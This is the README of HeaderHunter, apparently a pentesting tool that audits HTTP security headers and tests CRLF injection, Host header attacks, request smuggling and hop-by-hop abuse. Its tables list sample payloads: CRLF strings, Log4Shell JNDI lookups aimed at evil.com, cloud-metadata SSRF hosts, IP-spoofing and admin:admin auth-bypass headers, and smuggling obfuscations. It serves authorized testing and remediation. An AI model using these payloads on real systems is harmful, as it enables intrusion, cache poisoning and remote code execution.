# 🎯 HeaderHunter

### Comprehensive HTTP Header Security Analysis & Attack Tool

[![Python](<https://img.shields.io/badge/Python-3.8%2B-blue.svg>)](<https://python.org>)
[![License](<https://img.shields.io/badge/License-MIT-green.svg>)](LICENSE)
[![Platform](<https://img.shields.io/badge/Platform-Linux%20%7C%20macOS%20%7C%20Windows-lightgrey.svg>)]()
[![OWASP](<https://img.shields.io/badge/OWASP-Aligned-orange.svg>)](<https://owasp.org/www-project-secure-headers/>)

<p align="center">
  <img src="<https://img.shields.io/badge/Security%20Headers-34%20Checks-blue?style=for-the-badge>" />
  <img src="<https://img.shields.io/badge/CRLF%20Payloads-52%20Vectors-red?style=for-the-badge>" />
  <img src="<https://img.shields.io/badge/Host%20Attacks-25%20Techniques-orange?style=for-the-badge>" />
  <img src="<https://img.shields.io/badge/Fix%20Configs-5%20Servers-green?style=for-the-badge>" />
</p>

---

## 🔍 Overview

**HeaderHunter** is a production-grade offensive security tool purpose-built for comprehensive HTTP header analysis, vulnerability detection, and attack simulation. It performs **34+ security header checks**, tests **52 CRLF injection bypass vectors**, executes **25 Host header attack techniques**, detects **HTTP request smuggling** across 3 vulnerability classes, and generates **server-specific remediation configurations** for 5 major web servers.

Built for penetration testers, bug bounty hunters, and application security engineers who need a single-file, zero-dependency-overhead tool that covers the full HTTP header attack surface mapped to OWASP Secure Headers Project guidelines.

### Why HeaderHunter?

| Problem | HeaderHunter Solution |
|---|---|
| Fragmented tools for header testing | Single tool covering all header attack vectors |
| Generic security scanners miss header-specific vulns | Purpose-built engine with 52 CRLF bypass payloads |
| Manual Host header testing is tedious | Automated 25-technique Host header attack suite |
| No actionable fix guidance | Auto-generated configs for Nginx, Apache, IIS, Caddy, Traefik |
| Unclear compliance posture | Direct OWASP Secure Headers comparison with scoring |

---

## ✨ Features

### 🛡️ Security Header Analysis (34 Headers)
- Validates presence and configuration of all critical security headers
- Checks `Strict-Transport-Security`, `Content-Security-Policy`, `X-Frame-Options`, `X-Content-Type-Options`, `Referrer-Policy`, `Permissions-Policy`, and 28 more
- Deep CSP analysis detecting `unsafe-inline`, `unsafe-eval`, wildcard sources, missing directives
- Cookie security audit (`Secure`, `HttpOnly`, `SameSite` flags)
- CORS misconfiguration detection (wildcard origin, credentials leakage)
- Information disclosure header identification (23 fingerprinting headers)
- Letter-grade scoring system (A+ through F)

### 💉 CRLF Injection Testing (52 Payloads)
- Standard `%0d%0a` injection vectors
- Double URL encoding bypasses (`%250d%250a`)
- Unicode/UTF-8 encoding variants (`%E5%98%8A%E5%98%8D`, `%c4%8d%c4%8a`)
- Null byte prefix bypasses (`%00%0d%0a`)
- Tab and space padding evasion
- Triple encoding chains
- Response splitting for XSS and header injection
- Set-Cookie injection via CRLF
- Content-Type override for response body injection

### 🏠 Host Header Attacks (25 Techniques)
- **Password Reset Poisoning**: Tests 10 common reset endpoints with Host override
- **Cache Poisoning**: `X-Forwarded-Host`, `X-Forwarded-Scheme`, `X-Forwarded-Proto`, `X-Forwarded-Prefix`
- **SSRF via Host**: Localhost, cloud metadata (`169.254.169.254`), internal IPs, IPv6 `[::1]`, hex IP
- **Routing Manipulation**: `X-Original-URL`, `X-Rewrite-URL` path override
- **Host Override Headers**: `X-Forwarded-Host`, `X-Host`, `X-Forwarded-Server`, `X-HTTP-Host-Override`, `Forwarded`
- **Injection Variants**: Port injection, subdomain prepend, space/tab injection, `@` symbol abuse

### 📡 Request Header Injection (30 Vectors)
- IP spoofing via `X-Forwarded-For`, `X-Real-IP`, `X-Client-IP`, `X-Originating-IP`, `X-Remote-IP`, `X-Remote-Addr`
- Authorization bypass via `X-Custom-IP-Authorization`
- HTTP method override via `X-HTTP-Method-Override`, `X-Method-Override`, `X-HTTP-Method`
- URL override via `X-Original-URL`, `X-Rewrite-URL`
- Protocol/scheme override via `X-Forwarded-Proto`, `X-Forwarded-Scheme`, `X-Forwarded-Port`
- SQLi and XSS payloads via headers (User-Agent, Referer, X-Forwarded-For)
- Log4Shell (`${jndi:ldap://}`) via User-Agent and X-Forwarded-For
- Default credential testing via Authorization header
- Debug mode activation via `X-Debug`, `X-Debug-Mode`

### 🔀 HTTP Request Smuggling Detection
- **CL.TE** (Content-Length vs Transfer-Encoding): Front-end uses CL, back-end uses TE
- **TE.CL** (Transfer-Encoding vs Content-Length): Front-end uses TE, back-end uses CL
- **TE.TE** (Transfer-Encoding obfuscation): 10 obfuscation variants including:
  - Extra spacing: `Transfer-Encoding : chunked`
  - Tab character: `Transfer-Encoding:\\tchunked`
  - Invalid value: `Transfer-Encoding: xchunked`
  - Duplicate headers with conflicting values
  - Leading space: ` Transfer-Encoding: chunked`
  - Header line continuation: `Transfer-Encoding\\r\\n: chunked`
- Raw socket communication for accurate timing-based detection
- SSL/TLS support for HTTPS targets

### 🔗 Hop-by-Hop Header Abuse (25 Headers)
- Tests all RFC-defined hop-by-hop headers via `Connection` header manipulation
- Combined hop-by-hop + IP spoofing for ACL bypass detection
- Tests proxy-related headers: `Proxy-Connection`, `Proxy-Authenticate`, `Proxy-Authorization`
- Monitors status code and response size changes for behavioral detection

### 📊 OWASP Compliance Engine
- Direct comparison against OWASP Secure Headers Project guidelines
- Per-header compliance status with severity ratings
- Percentage-based compliance scoring
- Identifies gaps between current state and OWASP recommendations

### 🔧 Remediation Engine (5 Server Platforms)
- **Nginx**: `add_header` directives, `proxy_hide_header`, `server_tokens`, CRLF blocking rules, anti-smuggling proxy config
- **Apache**: `Header` directives, `ServerTokens`/`ServerSignature`, `RewriteRule` CRLF blocks, cookie hardening
- **IIS**: Complete `web.config` XML with `customHeaders`, `requestFiltering` CRLF rules, `httpRuntime` header checking
- **Caddy**: `Caddyfile` header block with add/remove directives
- **Traefik**: Dynamic YAML middleware configuration with all security headers

---

## 🏗️ Architecture

```
┌──────────────────────────────────────────────────────────┐
│                    HeaderHunter v2.0                      │
├──────────────────────────────────────────────────────────┤
│                                                          │
│  ┌─────────────┐  ┌──────────────┐  ┌────────────────┐  │
│  │  Baseline    │  │   Security   │  │     OWASP      │  │
│  │  Engine      │──│   Header     │──│   Compliance   │  │
│  │  (HTTP/TLS)  │  │   Analyzer   │  │   Comparator   │  │
│  └─────────────┘  └──────────────┘  └────────────────┘  │
│         │                                                │
│  ┌──────┴────────────────────────────────────────────┐   │
│  │              Attack Module Engine                  │   │
│  ├─────────────┬──────────────┬───────────────────────┤   │
│  │ CRLF        │ Host Header  │ Request Header        │   │
│  │ Injection   │ Attacks      │ Injection             │   │
│  │ (52 vectors)│ (25 techs)   │ (30 vectors)          │   │
│  ├─────────────┼──────────────┼───────────────────────┤   │
│  │ Request     │ Hop-by-Hop   │ Password Reset        │   │
│  │ Smuggling   │ Abuse        │ Poisoning             │   │
│  │ (CL.TE/     │ (25 headers) │ (10 endpoints)        │   │
│  │  [TE.CL/TE.TE](http://te.cl/TE.TE))                │   │    
│  └─────────────┴──────────────┴───────────────────────┘   │
│         │                                                 │
│  ┌──────┴────────────────────────────────────────────┐    │
│  │           Remediation & Reporting                  │   │
│  │  ┌────────┬────────┬─────┬───────┬─────────────┐  │    │
│  │  │ Nginx  │ Apache │ IIS │ Caddy │   Traefik   │  │    │
│  │  └────────┴────────┴─────┴───────┴─────────────┘  │    │
│  │  ┌─────────────────────────────────────────────┐   │   │
│  │  │         JSON Report Generator               │   │   │
│  │  └─────────────────────────────────────────────┘   │   │
│  └────────────────────────────────────────────────────┘   │
└──────────────────────────────────────────────────────────┘
```

### Core Components

| Component | Responsibility |
|---|---|
| `HeaderHunter` class | Main orchestrator managing session, baseline, and all scan modules |
| `get_baseline()` | Captures clean response for differential analysis |
| `analyze_security_headers()` | 34-header analysis with severity scoring |
| `test_crlf_injection()` | 52-payload CRLF injection scanner |
| `test_host_header_attacks()` | 25-technique Host header attack suite |
| `test_request_header_injection()` | 30-vector request header injection tester |
| `test_request_smuggling()` | Raw-socket CL.TE/TE.CL/TE.TE detection engine |
| `test_hop_by_hop_abuse()` | 25-header hop-by-hop manipulation tester |
| `owasp_comparison()` | OWASP Secure Headers compliance comparator |
| `generate_fix_configs()` | Multi-server remediation configuration generator |
| `_send_raw()` | Low-level socket engine for smuggling detection |
| `_analyze_csp()` | Deep Content-Security-Policy parser |

---

## 📦 Installation

### Prerequisites

- Python 3.8 or higher
- pip package manager

### Quick Install

```bash
# Clone the repository
git clone <https://github.com/yourusername/header-hunter.git>
cd header-hunter

# Install dependencies
pip install -r requirements.txt

# Verify installation
python header_hunter.py --help
```

### Requirements

```
requests>=2.31.0
urllib3>=2.0.0
colorama>=0.4.6
tabulate>=0.9.0
```

### One-liner Install

```bash
git clone <https://github.com/yourusername/header-hunter.git> && cd header-hunter && pip install requests urllib3 colorama tabulate && python header_hunter.py --help
```

### Docker (Optional)

```docker
FROM python:3.11-slim
WORKDIR /app
COPY header_hunter.py .
RUN pip install --no-cache-dir requests urllib3 colorama tabulate
ENTRYPOINT ["python", "header_hunter.py"]
```

```bash
docker build -t header-hunter .
docker run --rm header-hunter -u <https://example.com> --mode all
```

---

## 🚀 Usage

### Basic Scan (All Modules)

```bash
python header_hunter.py -u <https://target.com>
```

### Specific Scan Modes

```bash
# Security header analysis only
python header_hunter.py -u <https://target.com> --mode headers

# CRLF injection testing
python header_hunter.py -u <https://target.com> --mode crlf

# Host header attacks
python header_hunter.py -u <https://target.com> --mode host

# Request header injection
python header_hunter.py -u <https://target.com> --mode inject

# HTTP request smuggling detection
python header_hunter.py -u <https://target.com> --mode smuggle

# Hop-by-hop header abuse
python header_hunter.py -u <https://target.com> --mode hopbyhop

# OWASP compliance check
python header_hunter.py -u <https://target.com> --mode owasp

# Generate fix configurations
python header_hunter.py -u <https://target.com> --mode fix
```

### Advanced Options

```bash
# Full scan with verbose output, JSON report, and proxy
python header_hunter.py \\
  -u <https://target.com> \\
  --mode all \\
  -v \\
  -o report.json \\
  --proxy <http://127.0.0.1:8080> \\
  --cookies "session=abc123;csrf_token=xyz789" \\
  --timeout 15
```

### Command Reference

| Flag | Description | Default |
| --- | --- | --- |
| `-u`, `--url` | Target URL (required) | — |
| `--mode` | Scan mode | `all` |
| `-v`, `--verbose` | Enable debug-level output | `False` |
| `-o`, `--output` | JSON report output file path | — |
| `--timeout` | Request timeout in seconds | `10` |
| `--proxy` | HTTP/HTTPS proxy URL | — |
| `--cookies` | Session cookies (`key=val;key2=val2`) | — |

### Scan Modes

| Mode | Description | Tests Run |
| --- | --- | --- |
| `all` | Complete scan — all modules | Everything below |
| `headers` | Security header presence and configuration | 34 header checks |
| `crlf` | CRLF injection with bypass payloads | 52 payloads |
| `host` | Host header manipulation attacks | 25 techniques |
| `inject` | Request header injection vectors | 30 vectors |
| `smuggle` | HTTP request smuggling detection | CL.TE, [TE.CL](http://te.cl/), TE.TE |
| `hopbyhop` | Hop-by-hop header abuse | 25 headers |
| `owasp` | OWASP Secure Headers compliance | Full comparison |
| `fix` | Generate remediation configurations | 5 server platforms |

---

## ⚔️ Attack Modules

### Module 1: Security Header Analysis

Checks 34 HTTP response headers against security best practices:

**Critical Headers Checked:**

| # | Header | Severity | What It Prevents |
| --- | --- | --- | --- |
| 1 | `Strict-Transport-Security` | HIGH | Protocol downgrade, cookie hijacking |
| 2 | `Content-Security-Policy` | HIGH | XSS, data injection, clickjacking |
| 3 | `X-Frame-Options` | HIGH | Clickjacking |
| 4 | `X-Content-Type-Options` | MEDIUM | MIME sniffing attacks |
| 5 | `Referrer-Policy` | MEDIUM | Information leakage via Referer |
| 6 | `Permissions-Policy` | MEDIUM | Unauthorized API access (camera, mic, etc.) |
| 7 | `Cross-Origin-Embedder-Policy` | MEDIUM | Spectre-style side-channel attacks |
| 8 | `Cross-Origin-Opener-Policy` | MEDIUM | Cross-origin window manipulation |
| 9 | `Cross-Origin-Resource-Policy` | MEDIUM | Cross-origin resource theft |
| 10 | `Access-Control-Allow-Origin` | HIGH | CORS misconfiguration |
| 11 | `Set-Cookie` flags | HIGH | Session hijacking |

**Information Disclosure Detection (23 Headers):**

- `Server`, `X-Powered-By`, `X-AspNet-Version`, `X-AspNetMvc-Version`
- `X-Runtime`, `X-Version`, `X-Generator`, `X-Drupal-Cache`
- `X-Varnish`, `X-Cache`, `Via`, `X-Backend-Server`
- `X-Debug`, `X-Debug-Token`, `X-Debug-Token-Link`
- `X-Amz-Cf-Id`, `X-Amz-Cf-Pop`, `X-Amz-Request-Id`
- `X-Request-Id`, `X-Correlation-Id`, `X-Trace-Id`
- `X-Cache-Hits`, `X-Served-By`

**CSP Deep Analysis Checks:**

- `unsafe-inline` detection
- `unsafe-eval` detection
- Wildcard source () detection
- `data:` and `blob:` URI scheme detection
- Missing `default-src`, `script-src`, `frame-ancestors`, `base-uri`, `form-action`
- HTTP source in HTTPS context

---

### Module 2: CRLF Injection (52 Payloads)

**Encoding Categories:**

| Category | Example Payload | Count |
| --- | --- | --- |
| Standard URL encoding | `%0d%0aInjected-Header:true` | 8 |
| Double URL encoding | `%250d%250aInjected-Header:true` | 4 |
| Triple URL encoding | `%25250d%25250aInjected-Header:true` | 2 |
| Unicode encoding | `%E5%98%8A%E5%98%8DInjected-Header:true` | 3 |
| UTF-8 encoding | `%c4%8d%c4%8aInjected-Header:true` | 2 |
| Null byte prefix | `%00%0d%0aInjected-Header:true` | 2 |
| Mixed encoding | `%%0a0aInjected-Header:true` | 3 |
| Padding evasion | `%0d%20%0aInjected-Header:true` | 4 |
| Response splitting | `%0d%0a%0d%0a<script>alert(1)</script>` | 5 |
| Header injection | `%0d%0aSet-Cookie:crlf=injected` | 8 |
| Security bypass | `%0d%0aAccess-Control-Allow-Origin:*` | 6 |
| Redirect injection | `%0d%0aLocation:<http://evil.com`> | 3 |
| Escape sequences | `\\\\r\\\\nInjected-Header:true` | 2 |

---

### Module 3: Host Header Attacks (25 Techniques)

**Attack Categories:**

| Category | Technique | Risk |
| --- | --- | --- |
| Password Reset Poisoning | Host override on reset endpoints | Account takeover |
| Cache Poisoning | `X-Forwarded-Host` reflection | Stored XSS, phishing |
| SSRF | `Host: 127.0.0.1` | Internal network access |
| SSRF | `Host: 169.254.169.254` | Cloud metadata theft |
| SSRF | `Host: [::1]` (IPv6 localhost) | Firewall bypass |
| SSRF | `Host: 0x7f000001` (hex IP) | Filter bypass |
| Routing Override | `X-Original-URL: /admin` | Authorization bypass |
| Routing Override | `X-Rewrite-URL: /admin` | Authorization bypass |
| Port Injection | `Host: target.com:@evil.com` | Redirect to attacker |
| Subdomain Prepend | `Host: evil.com.target.com` | Virtual host confusion |
| Space Injection | `Host: target.com evil.com` | Parser differential |
| Tab Injection | `Host: target.com\\tevil.com` | Parser differential |
| Protocol Override | `X-Forwarded-Proto: nothttps` | Cache poisoning |
| Prefix Override | `X-Forwarded-Prefix: /poison` | Path manipulation |
| Duplicate Host | Two `Host` headers | Ambiguity exploit |

**Password Reset Endpoints Tested:**

```
/password/reset
/reset-password
/forgot-password
/api/password/reset
/api/auth/forgot-password
/users/password/new
/account/forgot-password
/auth/reset
/login/forgot
/wp-login.php?action=lostpassword
```

---

### Module 4: Request Header Injection (30 Vectors)

| Vector | Header | Value | Purpose |
| --- | --- | --- | --- |
| IP Spoof #1 | `X-Forwarded-For` | `127.0.0.1` | ACL bypass |
| IP Spoof #2 | `X-Real-IP` | `127.0.0.1` | ACL bypass |
| IP Spoof #3 | `X-Client-IP` | `127.0.0.1` | ACL bypass |
| IP Spoof #4 | `X-Originating-IP` | `127.0.0.1` | ACL bypass |
| IP Spoof #5 | `X-Remote-IP` | `127.0.0.1` | ACL bypass |
| IP Spoof #6 | `X-Remote-Addr` | `127.0.0.1` | ACL bypass |
| Multi-IP | `X-Forwarded-For` | `127.0.0.1, 10.0.0.1, 192.168.1.1` | Chain spoofing |
| Auth Bypass | `X-Custom-IP-Authorization` | `127.0.0.1` | Custom auth bypass |
| URL Override #1 | `X-Original-URL` | `/admin` | Path manipulation |
| URL Override #2 | `X-Rewrite-URL` | `/admin` | Path manipulation |
| Method Override #1 | `X-HTTP-Method-Override` | `PUT` | Method change |
| Method Override #2 | `X-Method-Override` | `DELETE` | Method change |
| Method Override #3 | `X-HTTP-Method` | `TRACE` | Method change |
| SQLi via Header | `X-Forwarded-For` | `' OR 1=1--` | SQL injection |
| XSS via UA | `User-Agent` | `<script>alert(1)</script>` | Stored XSS |
| XSS via Referer | `Referer` | `<script>alert(1)</script>` | Stored XSS |
| Log4Shell #1 | `X-Forwarded-For` | `${jndi:ldap://evil.com/x}` | RCE |
| Log4Shell #2 | `User-Agent` | `${jndi:ldap://evil.com/x}` | RCE |
| Default Creds | `Authorization` | `Basic YWRtaW46YWRtaW4=` | admin:admin |
| Debug Mode #1 | `X-Debug` | `1` | Info disclosure |
| Debug Mode #2 | `X-Debug-Mode` | `true` | Info disclosure |
| Proto Override | `X-Forwarded-Proto` | `https` | HTTPS spoof |
| Scheme Override | `X-Forwarded-Scheme` | `https` | Scheme spoof |
| Port Override | `X-Forwarded-Port` | `443` | Port manipulation |
| Origin Spoof | `Origin` | `https://trusted-site.com` | CORS bypass |
| Referer Spoof | `Referer` | `https://trusted-site.com` | Referer check bypass |
| Content Type | `Content-Type` | `application/json` | Parser manipulation |
| Accept Manip | `Accept` | `application/json` | Response format change |
| WAF Bypass | `X-WAF-Bypass` | `1` | WAF feature toggle |
| AJAX Spoof | `X-Requested-With` | `XMLHttpRequest` | CSRF bypass |

---

### Module 5: HTTP Request Smuggling

**Detection Methodology:**

```
CL.TE Detection:
┌─────────────┐          ┌──────────────┐
│  Front-End  │          │  Back-End    │
│  Uses CL    │──────────│  Uses TE     │
│  (reads 4B) │          │  (chunked)   │
└─────────────┘          └──────────────┘
     │                         │
     │  POST / HTTP/1.1        │
     │  Content-Length: 4      │  ← Front-end reads 4 bytes
     │  Transfer-Encoding:     │  ← Back-end processes chunked
     │    chunked              │
     │                         │
     │  1\\r\\n                  │
     │  Z\\r\\n                  │
     │  Q\\r\\n                  │  ← Leftover poisons next request
     └─────────────────────────┘

TE.CL Detection:
┌─────────────┐          ┌──────────────┐
│  Front-End  │          │  Back-End    │
│  Uses TE    │──────────│  Uses CL     │
│  (chunked)  │          │  (reads CL)  │
└─────────────┘          └──────────────┘
     │                         │
     │  POST / HTTP/1.1        │
     │  Content-Length: 100    │  ← Back-end waits for 100 bytes
     │  Transfer-Encoding:     │  ← Front-end processes chunked
     │    chunked              │
     │                         │
     │  0\\r\\n\\r\\n              │  ← Front-end done, back-end waiting
     │                         │     TIMEOUT = vulnerability
     └─────────────────────────┘
```

**TE.TE Obfuscation Variants Tested:**

1. `Transfer-Encoding: chunked` (normal)
2. `Transfer-Encoding : chunked` (extra space before colon)
3. `Transfer-Encoding: chunked` + `Transfer-Encoding: identity` (duplicate)
4. `Transfer-Encoding:\\tchunked` (tab separator)
5. `Transfer-Encoding: xchunked` (invalid prefix)
6. `Transfer-Encoding: chunked` + `Transfer-encoding: cow` (case variation)
7. `Transfer-Encoding: chunked` (leading space)
8. `X: X\\r\\nTransfer-Encoding: chunked` (header injection)
9. `Transfer-Encoding\\r\\n: chunked` (line continuation)
10. `Transfer-Encoding: chunk` (truncated value)

---

### Module 6: Hop-by-Hop Header Abuse

Tests 25 headers via `Connection` header to instruct proxies to remove them:

```
Connection: X-Forwarded-For     ← Proxy strips X-Forwarded-For
                                   Backend sees no IP = potential bypass
```

**Headers Tested:**`Connection`, `Keep-Alive`, `Proxy-Authenticate`, `Proxy-Authorization`, `TE`, `Trailers`, `Transfer-Encoding`, `Upgrade`, `Proxy-Connection`, `X-Forwarded-For`, `X-Forwarded-Host`, `X-Forwarded-Proto`, `X-Real-IP`, `X-Original-URL`, `X-Rewrite-URL`, `X-Custom-IP-Authorization`, `X-Originating-IP`, `X-Remote-IP`, `X-Remote-Addr`, `X-Client-IP`, `X-Host`, `X-Forwarded-Server`, `X-HTTP-Method-Override`, `X-Method-Override`, `X-Original-Method`

---

## 🏛️ OWASP Compliance

HeaderHunter maps all checks to the [OWASP Secure Headers Project](https://owasp.org/www-project-secure-headers/):

| OWASP Header | Checked | Deep Analysis |
| --- | --- | --- |
| Strict-Transport-Security | ✅ | max-age, includeSubDomains, preload |
| Content-Security-Policy | ✅ | 11 sub-checks (unsafe-inline, eval, wildcards, etc.) |
| X-Content-Type-Options | ✅ | Value validation |
| X-Frame-Options | ✅ | DENY vs SAMEORIGIN |
| X-XSS-Protection | ✅ | Recommends `0` per modern guidance |
| Referrer-Policy | ✅ | Value validation |
| Permissions-Policy | ✅ | Feature restriction validation |
| Cross-Origin-Embedder-Policy | ✅ | require-corp check |
| Cross-Origin-Opener-Policy | ✅ | same-origin check |
| Cross-Origin-Resource-Policy | ✅ | same-origin check |
| X-Permitted-Cross-Domain-Policies | ✅ | none check |
| Cache-Control | ✅ | no-store, private directives |
| Set-Cookie | ✅ | Secure, HttpOnly, SameSite |
| Access-Control-Allow-Origin | ✅ | Wildcard and null origin detection |
| Access-Control-Allow-Credentials | ✅ | Credentials + wildcard combo detection |
| Server (remove) | ✅ | Presence = information disclosure |
| X-Powered-By (remove) | ✅ | Presence = information disclosure |
| X-AspNet-Version (remove) | ✅ | Presence = information disclosure |
| Expect-CT | ✅ | Enforcement check |

---

## 🔧 Remediation Engine

Auto-generates complete, copy-paste-ready security configurations:

### Supported Servers

| Server | Config Format | Features |
| --- | --- | --- |
| **Nginx** | `nginx.conf` directives | `add_header`, `proxy_hide_header`, `server_tokens off`, CRLF rewrite rules, anti-smuggling proxy settings |
| **Apache** | `.htaccess` / VirtualHost | `Header` directives, `ServerTokens Prod`, `ServerSignature Off`, `RewriteRule` CRLF blocks |
| **IIS** | `web.config` XML | `customHeaders`, `requestFiltering` with `denyStrings`, `httpRuntime enableHeaderChecking` |
| **Caddy** | `Caddyfile` | `header` block with add (`+`) and remove (`-`) syntax |
| **Traefik** | Dynamic YAML | `middlewares.security-headers.headers` configuration |

---

## 📊 Output & Reporting

### Console Output

- Color-coded severity levels (`VULN` = bright red, `FAIL` = red, `WARN` = yellow, `PASS` = green, `INFO` = blue)
- Tabulated security header matrix
- Progress indicators for long-running scans
- Executive summary with finding counts

### JSON Report

```bash
python header_hunter.py -u <https://target.com> -o report.json
```

**Report Structure:**

```json
{
  "target": "<https://target.com>",
  "scan_date": "2024-01-15T14:30:00.000000",
  "total_findings": 12,
  "findings_by_level": {
    "VULN": 2,
    "FAIL": 5,
    "WARN": 5
  },
  "findings": [
    {
      "level": "VULN",
      "message": "CRLF injection confirmed with payload #3: %0D%0AInjected-Header:true"
    },
    {
      "level": "FAIL",
      "message": "Missing Strict-Transport-Security: Enforces HTTPS connections"
    }
  ]
}
```

---

## 📸 Screenshots

### Security Header Analysis

```
┌───────────────────────────────────┬──────────┬──────────┬─────────────────────────────────────────┐
│ Header                            │ Status   │ Severity │ Details                                 │
├───────────────────────────────────┼──────────┼──────────┼─────────────────────────────────────────┤
│ Strict-Transport-Security         │ OK       │ HIGH     │ Set to: max-age=31536000                │
│ Content-Security-Policy           │ WEAK     │ HIGH     │ unsafe-inline allows inline scripts     │
│ X-Content-Type-Options            │ OK       │ MEDIUM   │ Set to: nosniff                         │
│ X-Frame-Options                   │ MISSING  │ HIGH     │ Recommended: DENY                       │
│ X-Powered-By                      │ REMOVE   │ MEDIUM   │ Present: Express                        │
│ Server                            │ REMOVE   │ MEDIUM   │ Present: nginx/1.24.0                   │
└───────────────────────────────────┴──────────┴──────────┴─────────────────────────────────────────┘

Security Header Score: 62.5% (Grade: D)
  Present/Good: 20  Missing/Weak: 12
```

### Scan Summary

```
══════════════════════════════════════════════════════
  SCAN SUMMARY
══════════════════════════════════════════════════════

  Target: <https://target.com>
  Total Findings: 15
    VULN:  2
    FAIL:  7
    WARN:  6

  ⚠ CRITICAL VULNERABILITIES FOUND:
    • CRLF injection confirmed with payload #3
    • Host header attack [cache_poison]: X-Forwarded-Host reflected
```

---

## 🔬 Technical Details

### Detection Methodology

| Module | Detection Method |
| --- | --- |
| Security Headers | Presence check + value validation + CSP parsing |
| CRLF | Response header inspection for injected header names/values |
| Host Attacks | Differential analysis: response body/header reflection, status code changes, redirect inspection |
| Header Injection | Baseline comparison: status code delta, response size delta (>20% threshold), value reflection |
| Smuggling | Raw socket timing analysis: response delay >3s indicates potential vulnerability |
| Hop-by-Hop | Behavioral analysis: status code and response size changes when Connection header strips security headers |

### Baseline Differential Analysis

Every attack module compares results against a clean baseline request:

- **Status code** changes indicate access control or routing impact
- **Response size** changes (>20% delta) indicate different content served
- **Response hash** changes indicate content manipulation
- **Header reflection** indicates injection success
- **Timing delays** (>3s) indicate smuggling potential

### Security Considerations

- All requests use `verify=False` for SSL (pentesting context)
- `urllib3` warnings suppressed for cleaner output
- Raw sockets used only for smuggling detection (necessary for malformed HTTP)
- No persistent modifications to target — read-only testing with minimal POST requests (only for password reset detection)

---

## ⚖️ Legal Disclaimer

```
THIS TOOL IS PROVIDED FOR AUTHORIZED SECURITY TESTING ONLY.

You must have explicit written permission from the system owner before
running this tool against any target. Unauthorized access to computer
systems is illegal under laws including but not limited to:

  • Computer Fraud and Abuse Act (CFAA) — United States
  • Computer Misuse Act 1990 — United Kingdom
  • StGB §202a-c — Germany
  • Criminal Code Section 342.1 — Canada

The author assumes NO liability for misuse of this tool. Use responsibly
and ethically. Always obtain proper authorization.
```

---

## 🤝 Contributing

Contributions are welcome. Please follow these guidelines:

1. **Fork** the repository
2. **Create** a feature branch (`git checkout -b feature/new-attack-vector`)
3. **Add** tests for new payloads or modules
4. **Ensure** all existing checks still pass
5. **Submit** a pull request with a clear description

### Areas for Contribution

- [ ]  Additional CRLF encoding bypass payloads
- [ ]  HTTP/2 header testing support
- [ ]  WebSocket upgrade header testing
- [ ]  HAProxy remediation configuration
- [ ]  HTML report generation
- [ ]  CI/CD integration templates
- [ ]  Burp Suite extension bridge

---

Application Security Engineer | Penetration Tester | Tool Developer

- 🐙 [GitHub](https://github.com/rohit-1006)

### Built With

- Python 3 — Core language
- `requests` — HTTP session management
- `colorama` — Terminal color output
- `tabulate` — Formatted table display
- Raw sockets — HTTP smuggling detection

---

## 📄 License

This project is licensed under the MIT License — see the [LICENSE](https://www.notion.so/LICENSE) file for details.

---

<p align="center">
<b>⭐ If this tool helped your security testing, please star the repository ⭐</b>
</p>
